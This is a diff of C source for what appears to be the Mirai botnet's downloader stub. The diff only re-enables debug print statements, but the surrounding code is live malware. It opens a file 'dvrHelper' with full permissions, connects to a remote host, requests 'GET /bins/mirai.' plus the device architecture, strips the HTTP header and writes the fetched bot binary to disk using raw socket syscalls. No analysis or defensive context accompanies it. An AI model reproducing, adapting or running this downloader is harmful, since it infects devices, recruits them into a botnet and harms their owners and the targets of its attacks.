@@ -58,13 +58,13 @@ void x__exit(int);
 #define __exit x__exit
 
 #ifdef DEBUG
-/*
+
 void xprintf(char *str)
 {
     write(1, str, sstrlen(str));
 }
-#define printf xprintf
-*/
+#define println xprintf
+
 #endif
 
 void __start(void)
@@ -100,47 +100,47 @@ inline void run(void)
     ffd = open("dvrHelper", O_WRONLY | O_CREAT | O_TRUNC, 0777);
 
     sfd = socket(AF_INET, SOCK_STREAM, 0);
-/*
+
 #ifdef DEBUG
     if (ffd == -1)
-        printf("Failed to open file!\n");
+        println("Failed to open file!\n");
     if (sfd == -1)
-        printf("Failed to call socket()\n");
+        println("Failed to call socket()\n");
 #endif
-*/
+
     if (sfd == -1 || ffd == -1)
         __exit(1);
-/*
+
 #ifdef DEBUG
-    printf("Connecting to host...\n");
+    println("Connecting to host...\n");
 #endif
-*/
+
     if ((ret = connect(sfd, &addr, sizeof (struct sockaddr_in))) < 0)
-    {/*
+    {
 #ifdef DEBUG
-        printf("Failed to connect to host.\n");
-#endif*/
+        println("Failed to connect to host.\n");
+#endif
         write(STDOUT, "NIF\n", 4);
         __exit(-ret);
     }
-/*
+
 #ifdef DEBUG
-    printf("Connected to host\n");
+    println("Connected to host\n");
 #endif
-*/
+
     if (write(sfd, "GET /bins/mirai." BOT_ARCH " HTTP/1.0\r\n\r\n", 16 + arch_strlen + 13) != (16 + arch_strlen + 13))
-    {/*
+    {
 #ifdef DEBUG
-        printf("Failed to send get request.\n");
-#endif*/
+        println("Failed to send get request.\n");
+#endif
 
         __exit(3);
     }
-/*
+
 #ifdef DEBUG
-    printf("Started header parse...\n");
+    println("Started header parse...\n");
 #endif
-*/
+
     while (header_parser != 0x0d0a0d0a)
     {
         char ch;
@@ -150,11 +150,11 @@ inline void run(void)
             __exit(4);
         header_parser = (header_parser << 8) | ch;
     }
-/*
+
 #ifdef DEBUG
-    printf("Finished receiving HTTP header\n");
+    println("Finished receiving HTTP header\n");
 #endif
-*/
+
     while (1)
     {
         int ret = read(sfd, recvbuf, sizeof (recvbuf));
@@ -192,10 +192,10 @@ unsigned int utils_inet_addr(unsigned char one, unsigned char two, unsigned char
 
 int xsocket(int domain, int type, int protocol)
 {
-#if defined(__NR_socketcall)/*
+#if defined(__NR_socketcall)
 #ifdef DEBUG
-    printf("socket using socketcall\n");
-#endif*/
+    println("socket using socketcall\n");
+#endif
     struct {
         int domain, type, protocol;
     } socketcall;
@@ -205,14 +205,14 @@ int xsocket(int domain, int type, int protocol)
 
     // 1 == SYS_SOCKET
     int ret = syscall(SCN(SYS_socketcall), 1, &socketcall);
-/*
+
 #ifdef DEBUG
-    printf("socket got ret: %d\n", ret);
-#endif*/
+    println("socket got ret: %d\n", ret);
+#endif
      return ret;
 #else
 #ifdef DEBUG
-    //printf("socket using socket\n");
+    //println("socket using socket\n");
 #endif
     return syscall(SCN(SYS_socket), domain, type, protocol);
 #endif
@@ -230,10 +230,10 @@ int xwrite(int fd, void *buf, int len)
 
 int xconnect(int fd, struct sockaddr_in *addr, int len)
 {
-#if defined(__NR_socketcall)/*
+#if defined(__NR_socketcall)
 #ifdef DEBUG
-    printf("connect using socketcall\n");
-#endif*/
+    println("connect using socketcall\n");
+#endif
     struct {
         int fd;
         struct sockaddr_in *addr;
@@ -244,15 +244,15 @@ int xconnect(int fd, struct sockaddr_in *addr, int len)
     socketcall.len = len;
     // 3 == SYS_CONNECT
     int ret = syscall(SCN(SYS_socketcall), 3, &socketcall);
-/*
+
 #ifdef DEBUG
-    printf("connect got ret: %d\n", ret);
+    println("connect got ret: %d\n", ret);
 #endif
-*/
+
     return ret;
 #else
 #ifdef DEBUG
-    //printf("connect using connect\n");
+    //println("connect using connect\n");
 #endif
     return syscall(SCN(SYS_connect), fd, addr, len);
 #endif
